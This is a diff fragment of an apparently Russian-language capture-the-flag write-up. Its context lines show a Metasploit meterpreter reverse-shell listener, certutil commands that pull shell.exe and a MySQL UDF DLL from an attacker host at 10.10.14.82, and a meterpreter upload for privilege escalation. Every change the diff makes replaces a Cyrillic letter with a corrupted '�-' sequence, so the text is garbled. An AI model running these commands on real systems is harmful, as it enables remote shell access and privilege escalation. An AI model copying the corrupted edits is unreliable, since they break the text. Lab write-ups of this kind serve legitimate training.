@@ -194,7 +194,7 @@ python3 -m http.server 8000
 msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.82; set LPORT 4445; exploit"
 ```
 
-Загрузка и запуск:
+�-агрузка и запуск:
 
 ```cmd
 certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
@@ -317,7 +317,7 @@ NT AUTHORITY\Authenticated Users:(I)(M)
 
 ## Privilege Escalation (MySQL UDF Hijacking)
 
-Загрузка DLL:
+�-агрузка DLL:
 
 ```
 meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
@@ -369,7 +369,7 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 
 ## Flags
 
-| Флаг | Значение                         |
+| Флаг | �-начение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | <ROOT_FLAG> |
